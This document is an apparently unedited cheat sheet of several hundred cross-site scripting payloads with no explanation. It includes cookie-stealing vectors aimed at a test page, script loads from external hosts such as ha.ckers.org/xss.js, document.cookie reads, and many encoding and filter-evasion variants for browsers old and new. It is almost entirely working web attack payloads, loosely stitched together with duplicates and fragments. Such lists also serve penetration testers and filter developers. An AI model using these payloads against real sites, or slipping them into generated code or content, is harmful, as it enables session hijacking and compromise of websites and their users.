<li><a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>">
<li><a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">
Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>"> a(1)
a(1);
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
 
2) <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
 
3) <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
 
4) <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
 
5) <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ​
 
6) <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">​
 
7) <var onmouseover="prompt(1)">On Mouse Over</var>​
 
8) <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
 
9) <img src="/" =_=" title="onerror='prompt(1)'">
 
10) <%<!--'%><script>alert(1);</script -->
 
11) <script src="data:text/javascript,alert(1)"></script>
 
12) <iframe/src \/\/onload = prompt(1)
 
13) <iframe/onreadystatechange=alert(1)
 
14) <svg/onload=alert(1)
 
15) <input value=<><iframe/src=javascript:confirm(1)
 
16) <input type="text" value=``<div/onmouseover='alert(1)'>X</div>
 
17) http://www.<script>alert(1)</script .com
 
 
18) <iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
 
19) <svg><script ?>alert(1)
 
20) <iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 
21) <img src=`xx:xx`onerror=alert(1)>
 
22) <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
 
23) <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
 
24) <math><a xlink:href="//jsfiddle.net/t846h/">click
 
25) <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
 
26) <svg contentScriptType=text/vbs><script>MsgBox+1
 
27) <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
 
28) <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
 
29) <script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
 
30) <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
 
31)  <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ​​​​​​​​​​​​
 
32) <object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
 
33) <script>+-+-1-+-+alert(1)</script>
 
34) <body/onload=&lt;!--&gt;&#10alert(1)>
 
35) <script itworksinallbrowsers>/*<script* */alert(1)</script ​
 
36) <img src ?itworksonchrome?\/onerror = alert(1)​​​
 
37) <svg><script>//&NewLine;confirm(1);</script </svg>
 
38) <svg><script onlypossibleinopera:-)> alert(1)
 
39) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
 
40) <script x> alert(1) </script 1=2
 
41) <div/onmouseover='alert(1)'> style="x:">
 
42)  <--`<img/src=` onerror=alert(1)> --!>
 
43)  <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​
 
44) <div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>​
 
45) "><img src=x onerror=window.open('https://www.google.com/');>
%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
&#x22;&#x3E;&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
&#34&#62&#60&#115&#99&#114&#105&#112&#116&#62&#97&#108&#101&#114&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#
62Ij48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+
 
46) <form><button formaction=javascript&colon;alert(1)>CLICKME
 
47) <math><a xlink:href="//jsfiddle.net/t846h/">click
 
48) <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​
 
49) <iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 
<iframe
 id="test"
 src="http://html5sec.org/xssme?xss=%20href=javascript:alert(location.host)%20x="
 sandbox
style="width: 100%; height: 100%;"></iframe>
 
<script>
 var iframe = document.getElementById('test');
 iframe.addEventListener('load', function() {
  iframe.sandbox = 'allow-scripts';
 });
</script>
a=o.a;
1&&0//0
1||2//1
1&&2//2
i=alert
0||1//1 
\u9999(1)
\u9998(1)
$\u5003=1
\u55FF=-1
_(a)(1); 
-alert(1)
c=e(s+a);
\u5001$=1
+-alert(1)
\u9997(1) 
\u5000$(1)
\u5001_=-1
0/alert(1)
--alert(1)
a=#1=alert;
\u002f/test
&#54280;=-1
[-alert(1)]
/\u002ftest
'test\u0027;
/test\u002f;
\u0022test";
\u0027test';
\u9997=alert
\u9998=alert
\u9999=alert
"test\u0022;
\u002ftest/;
@cc_off@cc_on
''in alert(1)
0 == ''//true
\u0061lert(1) 
v=(/t/+[])[1];
y=(/o/+[])[1];
z=(/C/+[])[1];
d=(/./+[])[1];
o=(/n/+[])[1];
<alert(/xss2/)
t=String(v+y);
x=(/r/+[])[1];
alert\u000a(1)
/^/in alert(1)
alert\u000D(1)
alert\u2028(1)
alert\u2029(1)
'); alert('XSS
i=(/i/+[])[1];
delete alert(1)
0 == '0'//true 
<SCRIPT>a=/XSS/
window.alert(1)
alert(o2.test);
alert(o1.test);
o2 = clone(o1);
o={a:#1=alert};
throw alert(1) 
typeof alert(1)
<? echo('<SCR)';
<;HTML>;<;BODY>;
top["alert"](6);
undefined=alert;
~[,].map(prompt)
'' == '0'//false
<HTML xmlns:xss>
x=new VBArray(a);
""@cc_on/alert(1)
/**\u002falert(1)
Simple version...
\u002f**/alert(1)
x=[].x=[].y=alert
0[\u55FD](\u55FC)
this["alert"](7);
\u50002=/eva/[-1]
'>//\\,<'>">">"*"
<;SCRIPT>;a=/XSS/
";alert('XSS');//
\";alert('XSS');//
'';!--"<XSS>=&{()}
&#47&#46source&#41
//</script><?='µ';
0/eval('alert(1)')
alert(1)[alert(2)]
window['alert'](1)
'>//\\,<'>">">"*"4
<;HTML xmlns:xss>;
x[{}].valueOf()(1) 
[1,2].reduce(alert)
false == '0'//true 
x[{}]=!/\\/?{}:eval
instanceof alert(1)
x='aler\u200ft(1)' 
eval(RegExp['$&']) 
o2.test = 'hello2';
alert((3).clone());
var array = [1,2,3]
alert(array.pop(3))
window["alert"](1);
alert(bs("window"))
<;? echo(';<;SCR)';;
x[/\\/].valueOf()(1)
x[{}]=!/\\/?[]:alert
RegExp(/a/,alert(1))
!alert(2)in!alert(1)
new Date in alert(1)
a=__proto__['alert']
\u000Aalert\u000A(1)
Script('/'.concat(/\
0..eval('alert(1)') 
\";;alert(';XSS';);//
e=<a>ev<b></b>al</a> 
alert(1)/@works_in_ff
alert(1)-alert(/two/)
o1 = {test:'hello1'};
alert(clone.clone());
function Anything(){}
(i[-5]['eval'](i))(1)
this._=window.a=null;
<SCRIPT>alert("Test")
(1<1>alert(false)<1>1)
<SCRIPT>alert("Test");
<object data=//h4k.in>
alert("test".clone());
(1<<1>>alert(2)<<1>>1)
> delete ,delete a(1) 
> delete~/delete a(1) 
['alert(1)'].map(eval)
@cc_on@_win32/alert(1) 
if(false);else~alert(1)
false == 'false'//false
['alert(1)'].some(eval)
0[\u50002+'l'](\u50003)
alert(1)['*(&£%(*&£^(']
['alert(1)'].every(eval)
<IMG SRC="mocha:[code]">
  <xss:xss>XSS</xss:xss>
alert(a.source)</SCRIPT>
14) <svg/onload=alert(1)
e=self[490837[t+s](32)];
and a fun huge button :)
x[/\\/]=!/\\/?/\\/:alert
$\u5001=/\u00/[-$\u5003]
new RegExp(/a/,alert(1))
typeof AnYThing^alert(1)
SyntaxError[a=#1=alert];
a=0[eval[-6]](alert[-6])
onmouseover=alert(1)//" 
';';;!--";<;XSS>;=&;{()}
([],[].sort)() == window 
'); alert('xss'); var x='
<base href='javascript:'>
['alert(1)'].filter(eval)
['alert(1)',1].sort(eval)
\u5001_[\u5002_](\u5003_)
x=[/&/,alert,/&/][1],x(1)
top.* =alert,self['*'](1)
x=[1,2,3].input=alert,4,5
for (i in array) alert(i)
a+'lert'=='alert'? Sure! 
alert(1)/).concat(/ /))()
<img src='alert("w00f");'>
\u002f**/alert(1)\u002f**/
<A HREF="//google">XSS</A>
window.alert("Bonjour !");
<BODY ONLOAD=alert('XSS')>
<script>alert(1);</script>
<frameset onload=alert(1)>
<BODY ONLOAD=alert(’XSS’)>
alert(<a>alert(false)</a>)
['alert(1)'].forEach(eval)
<img onerror=alert(/1/) / >
<!-- alert(/WTF XSS3/)`--> 
['alert(1)',1].reduce(eval)
x=[].reverse,x() === window
0?1:!1?0:0?1:1/alert(1)?1:1
-Math.abs[(+alert(/boo/))] 
window.top.window.alert(4);
19) <svg><script ?>alert(1)
<BR SIZE="&{alert('XSS')}">
"><script>alert(0)</script>
j=String((/j/+[])[1]+y+i+o);
document.designMode=/On/[-1]
%22%2Balert(%27XSS%27)%2B%22
delete~[a=alert]/delete a(1)
alternative to toString()...
<;IMG SRC=";mocha:[code]";>;
0.[!0?/eval/[~0]:$](name).@_
&#54280;[&#21477;](&#22924;)
0[/eval/[-$\u5003]]($\u5002)
<body onLoad="alert('XSS');"
<SCRIPT>alert('XSS')</SCRIPT>
({}=[].concat)()[0] == window
<img src \/onerror = alert(2)
x[/\\/]+=!/\\/?{}:(/ert/)[-1]
\u5000$=\u5001$?alert:\u5001$
\u55FD=RegExp(/eval/)[\u55FF]
'xxxalert(1)'.match(/[^x]+/);
i=alert;(i[-5]['eval'](i))(1)
<b <script>alert(1)</script>0
¼script¾alert(¢XSS¢)¼/script¾
<br size=\"&{alert('XSS')}\">
\\'); alert(\'xss\');var x=\'
<IMG SRC="livescript:[code]">
&{document.vulnerable=true;};
delete [a=alert],delete a(1) 
<SCRIPT>alert('XSS');</SCRIPT>
<;BODY ONLOAD=alert(';XSS';)>;
<input type="text" USER_INPUT>
/onload=alert(/xss/)></iframe>
default xml namespace=(e)=eval
<script>alert(»XSS«)</script> 
Works for any global object :D
Function('a','\al\ert(a)')(1) 
<SCRIPT SRC=//ha.ckers.org/.j>
scriptalertdocumentcookiescript
\";document.vulnerable=true;;//
alert("8:"+document["cookie"]);
\u50003=0[\u50002+'l'](\u50001)
x[/\\/]=(/:/)[-0]?{}:(/al/)[-1]
<form id="location" href="bar">
<IMG STYLE='no\xss:noxss("/*");
alert("1"["replace"]('1','9'));
a=<test>al<!---->ert(1)</test> 
='><script>alert("xss")</script>
try{IE=window=!1}catch(e){IE=!0}
[].sort.call(null).alert('lose')
<script<{alert(1)}/></script </>
for(_=console.dir;_==_;_(_))_(_)
default xml namespace = alert(1)
<object classid="clsid:..." cod.
" onmousemove=alert("XSS") "> <"
<SCRIPT> alert(“XSS”); </SCRIPT>
<;SCRIPT SRC=//ha.ckers.org/.j>;
<;A HREF=";//google";>;XSS<;/A>;
[1,'alert(1)'].reduceRight(eval)
javascript:alert(function()1+1);
g:0in~/*for another*/~alert(!!1) 
<IMG SRC=JaVaScRiPt:alert('XSS')>
</br style=a:expression(alert())>
'">><script>alert('XSS')</script>
<div id=&#42&#x2f&#13&#40&#47XSS1
<body onload=&lt;!--&#10alert(1)>
new Function("return '\141'")(); 
\u55FC=RegExp(/alert(1)/)[\u55FF]
<IMG SRC=javascript:alert("XSS")>
>"'><script>alert(‘XSS')</script>
<;IMG SRC=";livescript:[code]";>;
>"><script>alert("XSS")</script>&
<<SCRIPT>alert("XSS");//<</SCRIPT>
<input onfocus=write(1) autofocus>
<_ />/<_ />+~~~~~~<_{alert(1)} /> 
foo\’; alert(document.cookie);//’;
typeof setTimeout('alert(this)',0)
<object data=javascript:\alert(1)>
harmless=" onmouseover=alert(1)//"
<input autofocus onfocus=alert(1)>
<;BR SIZE=";&;{alert(';XSS';)}";>;
&{document.write("XSS-XSS-XSS");};
<x style="behavior:url(test.sct)">
<IMG SRC="javascript:alert('XSS')"
<IMG SRC='vbscript:msgbox("XSS")'>
'>><marquee><h1>XSS</h1></marquee>
<XML SRC="xsstest.xml" ID=I></XML>
</script><script>alert(1)</script>
@cc_on@_ok_would_you_like_an_alert
<undefined></undefined>.(alert(1))
top[a='al',b='ev',b+a]('alert(1)')
""@cc_on,x=@cc_on'something'@cc_on
"><script>alert('XSS')</script>    
<img src=1.gif onerror=alert(1337)>
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
<;/br style=a:expression(alert())>;
<video poster=javascript:alert(1)//
eval(x.toArray().join('')+'rt(1)');
<A HREF="//www.google.com/">XSS</A>
<img src="javascript:alert('XSS')">
'">><marquee><h1>XSS</h1></marquee>
"><iframe src=http://www.google.de>
SCRIPT>alert(/XSS/.source)</SCRIPT>
<@uni>c=<@/uni>/c/<@uni>[-1]<@/uni>
\u5002_=/e/[\u5001_]+/val/[\u5001_]
{x/*@cc_on=alert@*/}x/*@(/xss/@*/) 
Script(XML()..x.@y?'alert(1)':2.)()
eval===self[490837['toString'](32)]
default xml namespace=e('alert(1)')
<select autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
alert(alert(alert(alert(1).watg))) 
<IMG SRC="javascript:alert('XSS');">
<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
<A HREF="http://1113982867/">XSS</A>
exp/*<A STYLE='no\xss:noxss("*//*");
<A HREF="http://google.com/">XSS</A>
<IMG SRC='vbscript:msgbox(\"XSS\")'>
alert( String(/Test/).substr(1,4) );
<img src=1.gif onerror=alert(close)>
<script/onreadystatechange=alert(1)>
<img src= alt=" onerror=alert(1)//">
find(function(){alert(1,find())}());
([0]['eval'])([{$:'alert(0)'}.$][0])
<@uni>z=<@/uni>/00/<@uni>[-1]<@/uni>
/*@cc_on@set @x=1@*/@cc_on alert(@x)
~@_very_well?alert(1):@_there_you_go
‘; alert(document.cookie); var foo=’
<SCRIPT>alert(/XSS/.source)</SCRIPT>
40) <script x> alert(1) </script 1=2
<@uni>b=<@/uni>/\u/<@uni>[-1]<@/uni>
<;IMG SRC=javascript:alert(';XSS';)>;
</title><script>alert(/xss/)</script>
21) <img src=`xx:xx`onerror=alert(1)>
<XSS STYLE="behavior: url(xss.htc);">
!--" /><script>alert('xss');</script>
<scrscriptipt>alert(1)</scrscriptipt>
<// style=x:expression\28write(1)\29>
<script src="#">{alert(1)}</script>;1
echo('IPT>alert("XSS")</SCRIPT>'); ?>
x[{}].valueOf()(x[/\\/]+(/(1)/)[-1]) 
and:try{1in to}catch(møre){alert(!1)}
a='alert';eval(<{a}>{a}</{a}>+'(a)') 
({strange:'stuff man'}).* = alert(1);
P=function(a,b){return Math.pow(a,b)}
Function.call(undefined,'alert(1)')()
<textarea autofocus onfocus=alert(1)>
<IMG SRC="jav ascript:alert('XSS');">
xss:ex/*XSS*/pression(alert("XSS"))'>
<style>*[{}@import'test.css?]</style>X
" onfocus=alert(document.domain) "> <"
exp/*<XSS STYLE='no\xss:noxss("*//*");
<IMG SRC=JaVaScRiPt:alert("XSS<WBR>")>
<SCRIPT SRC=http://ha.ckers.org/xss.js
<A HREF="http://66.102.7.147/">XSS</A>
<IMG LOWSRC="javascript:alert('XSS')">
33) <script>+-+-1-+-+alert(1)</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
12) <iframe/src \/\/onload = prompt(1)
<IMG DYNSRC="javascript:alert('XSS')">
<img src=foo.png onerror=alert(\1\) \>
<img src=foo.png onerror=alert(/1/) />
"></iframe><script>alert(123)</script>
({}).valueOf.call(null).alert('lose');
&#21477;=/e/[&#54280;]+/val/[&#54280;]
top/**/['\x61\x6c\x65\x72\x74']/**/(1)
o={"b"getter:Function('alert(1)')},o.b
'></select><script>alert(123)</script>
<iframe "onload=alert(/XSS/)></iframe> 
35) <script ~~~>alert(0%0)</script ~~~>
<IMG DYNSRC="javascript:alert('XSS');">
<;IMG SRC=";javascript:alert(';XSS';)";
<;SCRIPT SRC=http://ha.ckers.org/xss.js
<br size=\"&{alert(&#039;XSS&#039;)}\">
<img src=&{document.vulnerable=true;};>
<br SIZE="&{document.vulnerable=true}">
<body ONLOAD=document.vulnerable=true;>
<IMG"""><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC="  javascript:alert('XSS');">
<IMG LOWSRC="javascript:alert('XSS');">
with(this)watch('XSS',alert),XSS=false 
\u5003_=/a/[\u5001_]+/lert(1)/[\u5001_]
\u0063\u003d/c/\u005b\u002d\u0031\u005d
<image src="" onerror="alert(/XSS/)" />
<input onblur=focus() autofocus><input>
<b><script<b></b><alert(1)</script </b>
'"></title><script>alert(1111)</script>
13) <iframe/onreadystatechange=alert(1)
<IMG SRC="jav   ascript:alert('XSS');">
<SCRIPT>document.write("XSS");</SCRIPT>
<IMG LOWSRC=\"javascript:alert('XSS')\">
<table background="javascript:alert(1)">
<BASE HREF="javascript:alert('XSS');//">
<BGSOUND SRC="javascript:alert('XSS');">
</textarea><script>alert(/xss/)</script>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<script>var var = 1; alert(var)</script>
<body oninput=alert(1)><input autofocus>
<IMG DYNSRC=\"javascript:alert('XSS')\">
<;/script>;<;script>;alert(1)<;/script>;
<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
<SCRIPT>a=/XSS/nalert(a.source)</SCRIPT>
<iframe/ "onload=alert(/XSS/)></iframe> 
<img src onerror /" '"= alt=alert(1)//">
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style>
<div style=content:url(test2.svg)></div>
\u0062\u003d/\u/\u005b\u002d\u0031\u005d
\u007a\u003d/00/\u005b\u002d\u0031\u005d
this.watch('_',function(){return eval});
.0.*?1.:Script(.0.*?1.:'\134u006eame')()
<iframe/ /onload=alert(/XSS/)></iframe> 
eval(toNonAscii("return alert"))('123'); 
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
34) <body/onload=&lt;!--&gt;&#10alert(1)>
<A HREF="http://www.google.com./">XSS</A>
<script>alert(document.location)</script>
""@cc_on,x=@anything 'something'@anything
“><ScRiPt>alert(document.cookie)</script>
<body onLoad="while(true) alert('XSS');">
[~alert(1)] --> writes -1 instead of NaN.
<TD BACKGROUND="javascript:alert('XSS')">
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
<body onload="document.vulnerable=true;">
</XSS STYLE=xss:expression(alert('XSS'))>
<;A HREF=";//www.google.com/";>;XSS<;/A>;
<;scrscriptipt>;alert(1)<;/scrscriptipt>;
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
42)  <--`<img/src=` onerror=alert(1)> --!>
eval((['ale','rt(1)']+'').replace(/,/,''))
<body onunload="javascript:alert('XSS');">
alert(String.fromCharCode(88,83,83));'))">
10) <%<!--'%><script>alert(1);</script -->
<img src=foo.png onerror=alert(/xssed/) />
<IMG SRC="jav&#x09;ascript:alert('XSS');">
src="http://www.site.com/XSS.js"></script>
<XSS STYLE="xss:expression(alert('XSS'))">
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
"/></a></><img src=1.gif onerror=alert(1)>
[_=alert,__=document.cookie]&delete-_(__) 
“><script >alert(document.cookie)</script>
<script>({0:#0=alert/#0#/#0#(0)})</script>
document.body.innerHTML=name location=name
s=String((/S/+[])[1]+v+x+i+o+(/g/+[])[1]);
&#22924;=/a/[&#54280;]+/lert(1)/[&#54280;]
<object data=jav&#x61script:\u0061lert(2)>
"><script>ale rt('XSS');</s c r i p t><!--
<script>document.vulnerable=true;</script>
Ľscriptľdocument.vulnerable=true;Ľ/scriptľ
<~/XSS STYLE=xss:expression(alert('XSS'))>
<;IMG SRC=";javascript:alert(';XSS';);";>;
exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
<;<;SCRIPT>;alert(";XSS";);//<;<;/SCRIPT>;
<;A HREF=";http://1113982867/";>;XSS<;/A>;
<;A HREF=";http://google.com/";>;XSS<;/A>;
/./(".")['ev'+''+''+'al']('a'+'ler'+'t(1)')
+-0?+-1:!1?+-0:+-0?+-1:+-1/alert(1)?+-1:+-1
alert(uneval(/eval/).replace(/\//g, [ ] ));
data:text/html,<script>location+=1</script>
<div style="font-family:foo}color=red;">XXX
<script>/*</script*>*/alert('XSS')</script>
<div style="binding: url([link to code]);">
&<script>document.vulnerable=true;</script>
<img src="mocha:document.vulnerable=true;">
<<script>document.vulnerable=true;</script>
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
tt      p://6&#9;6.000146.0x7.147/">XSS</A>
<BODY BACKGROUND="javascript:alert('XSS')">
alert(atob('amF2YXNjcmlwdDphbGVydCgxKQ')); 
<img src="x` `<script>alert(1)</script>"` `>
<img src= alt=" hello=">" onerror=alert(1)> 
<iframe///////onload=alert(/XSS/)></iframe> 
this["window"]["top"]["window"]["alert"](5);
'">><<<iMg sRc=1.gif onerror = alert("1")>>>
<TABLE BACKGROUND="javascript:alert('XSS')">
<;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
<BODY BACKGROUND="javascript:alert('XSS');">
$\u5002=/u61u6cu65u72u74u28u31u29/[-$\u5003]
[url=javascript:alert('XSS');]click me[/url]
<% foo><x foo="%><script>alert(1)</script>">
<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
41) <div/onmouseover='alert(1)'> style="x:">
<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
17) http://www.<script>alert(1)</script .com
<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
<A HREF="http://ha.ckers.org@google">XSS</A>
<IMG SRC=" &#14;  javascript:alert('XSS');">
<A HREF="http://google:ha.ckers.org">XSS</A>
<img src=&{document.write("XSS-XSS-XSS");};>
<;IMG DYNSRC=";javascript:alert(';XSS';);";>;
<script <B>document.vulnerable=true;</script>
"><script>alert(document.location)</script><"
<video><source onerror="javascript:alert(1)">
<video onerror="javascript:alert(1)"><source>
<?xml-stylesheet href="javascript:alert(1)"?>
foo%00<script>alert(document.cookie)</script>
<img src=asdf onerror=alert(document.cookie)>
['I like'],{g:0in~/*for another*/~alert(!!1)}
Function.apply(undefined,['s','alert(s)'])(1)
<div onmouseover="document.vulnerable=true;">
<div style="behaviour: url([link to code]);">
<;IMG LOWSRC=";javascript:alert(';XSS';);";>;
<img SRC='vbscript:document.vulnerable=true;'>
4) <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
“><<script>alert(document.cookie);//<</script>
execScript('Dim a(1)\na(0)="ale"','vbscript');
<;BGSOUND SRC=";javascript:alert(';XSS';);";>;
<;BASE HREF=";javascript:alert(';XSS';);//";>;
new({b setter:Function}.b='alert\x28\x31\x29')
<DIV STYLE="width: expression(alert('XSS'));">
43) <iframe/%00/ src=javaSCRIPT&colon;alert(1)
eval(/a......./.exec(/#####alert(1)#####/)[0])
.0.*?1.:Script(.0.*?1.:'eval(\134u006eame)')()
<input type="text" AUTOFOCUS onfocus=alert(1)>
</br style=a:expression(alert())>             
<A HREF="hntttp://6 6.000146.0x7.147/">XSS</A>
<body onload="document.write("XSS-XSS-XSS");">
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
“><s”%2b”cript>alert(document.cookie)</script>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
[color=red width=expression(alert(123))][color]
<![><img src="]><img src=x onerror=alert(1)//">
<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
<;A HREF=";http://www.google.com./";>;XSS<;/A>;
<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;
<scr<script>ipt>alert('XSS');</scr</script>ipt>
<a href="javascript#document.vulnerable=true;">
<img SRC="javascript:document.vulnerable=true;"
javascript:NaN = window;eval(0/0+".alert(1)"); 
javascript: number = alert; eval(typeof(1))(1);
name='alert(/Chloe is gorgeous (my daughter)/)'
window.watch('a',function(a){return a+'lert'});
document.location.toSource()[e]('ale'+'rt(1)') 
eval(\u002fale\rt(1)/[-1].replace(/\\|\n/g,''));
new Function('\141\154\145\162\164\50\61\51')();
<;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>;
<event-source src="event.php" onload="alert(1)">
<svg><style>&ltimg/src=x onerror=alert(1)// </b>
<? foo="><x foo='?><script>alert(1)</script>'>">
<!--<img src="--><img src=x onerror=alert(1)//">
<form><button formaction="javascript:alert(1)">X
<marquee><script>alert('XSS')</script></marquee>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
@if(@_mc680x0)@else alert(@_jscript_version)@end
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<;XSS STYLE=";xss:expression(alert(';XSS';))";>;
<xml src="javascript:document.vulnerable=true;">
<img src="livescript:document.vulnerable=true;">
<img SRC="javascript:document.vulnerable=true;">
"\><\a><\><img src=foo.png onerror=alert(\1\) \>
<body onload="javascript:alert(([code])"></body>
<img src="mocha:document.write("XSS-XSS-XSS");">
&<script>document.write("XSS-XSS-XSS");</script>
<iframe src=http://ha.ckers.org/scriptlet.html <
window["window"]["window"]["window"]["alert"](3);
38) <svg><script onlypossibleinopera:-)> alert(1)
<;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";>;
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<iframe src="vbscript:document.vulnerable=true;">
<img SRC="jav ascript:document.vulnerable=true;">
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
<BODY onload!#$%&()*~+-_.,:;?@[/]^`=alert("XSS")>
<;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";>;
</script><script >alert(document.cookie)</script>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
12) &#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
9) <img src="/" =_=" title="onerror='prompt(1)'">
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
5) <img/src=`%00` onerror=this.onerror=confirm(1)
<;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";>;
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
